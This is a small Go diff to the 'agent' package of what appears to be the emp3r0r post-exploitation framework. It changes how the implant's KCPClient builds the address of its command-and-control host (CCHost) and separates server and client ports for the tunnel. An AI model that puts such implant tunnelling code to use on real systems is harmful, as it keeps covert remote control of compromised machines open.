@@ -1,6 +1,7 @@
 package agent
 
 import (
+	"fmt"
 	"log"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
@@ -12,7 +13,8 @@ func KCPClient() {
 	if !RuntimeConfig.UseKCP {
 		return
 	}
-	err := tun.KCPTunClient(RuntimeConfig.CCHost, RuntimeConfig.KCPPort,
+	kcp_server_addr := fmt.Sprintf("%s:%s", RuntimeConfig.CCHost, RuntimeConfig.KCPServerPort)
+	err := tun.KCPTunClient(kcp_server_addr, RuntimeConfig.KCPClientPort,
 		RuntimeConfig.Password, emp3r0r_data.MagicString)
 	if err != nil {
 		log.Printf("KCPTUN failed to start: %v", err)
